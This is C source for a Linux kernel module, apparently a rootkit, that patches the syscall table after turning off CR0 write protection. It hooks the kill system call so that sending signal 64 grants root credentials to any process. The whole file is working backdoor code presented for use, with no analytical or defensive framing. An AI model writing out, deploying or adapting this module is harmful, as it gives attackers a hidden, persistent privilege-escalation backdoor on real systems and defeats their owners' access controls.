// file: terminus_ring0.c
// desc: pure kernel-level privilege escalation. 
// compile: make (requires kernel headers)

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("terminus");
MODULE_DESCRIPTION("fuck userland");

// the magic signal to trigger root
#define MAGIC_SIG 64

// pointer to the original sys_kill
asmlinkage long (*original_sys_kill)(pid_t pid, int sig);

// our hijacked sys_kill
asmlinkage long terminus_sys_kill(pid_t pid, int sig) {
    struct cred *new_creds;
    
    if (sig == MAGIC_SIG) {
        printk(KERN_DEBUG "[terminus] magic signal received. elevating to root.\n");
        
        // allocate new credentials
        new_creds = prepare_creds();
        if (new_creds != NULL) {
            // set everything to 0 (root)
            new_creds->uid.val = 0;
            new_creds->gid.val = 0;
            new_creds->euid.val = 0;
            new_creds->egid.val = 0;
            new_creds->suid.val = 0;
            new_creds->sgid.val = 0;
            new_creds->fsuid.val = 0;
            new_creds->fsgid.val = 0;
            
            // commit the new credentials to the current process
            commit_creds(new_creds);
            return 0; // success
        }
    }
    
    // if not the magic signal, act like normal
    return original_sys_kill(pid, sig);
}

// finding the syscall table.
unsigned long **get_syscall_table(void) {
    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
}

// disable write protection on cr0 register
void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(val), "+m"(__force_order));
}

static void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~0x10000));
}

static void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
}

static int __init terminus_init(void) {
    unsigned long **syscall_table;
    
    printk(KERN_DEBUG "[terminus] injecting into ring 0...\n");
    
    syscall_table = get_syscall_table();
    if (!syscall_table) {
        printk(KERN_DEBUG "[terminus] failed to find syscall table.\n");
        return -1;
    }

    // save the real kill syscall
    original_sys_kill = (void *)syscall_table[__NR_kill];
    
    // disable memory protection and overwrite the pointer
    unprotect_memory();
    syscall_table[__NR_kill] = (unsigned long *)terminus_sys_kill;
    protect_memory();
    
    printk(KERN_DEBUG "[terminus] hook established. send signal 64 to get root.\n");
    return 0;
}

static void __exit terminus_exit(void) {
    unsigned long **syscall_table;
    
    printk(KERN_DEBUG "[terminus] pulling out...\n");
    
    syscall_table = get_syscall_table();
    if (syscall_table) {
        unprotect_memory();
        // restore original
        syscall_table[__NR_kill] = (unsigned long *)original_sys_kill;
        protect_memory();
    }
}

module_init(terminus_init);
module_exit(terminus_exit);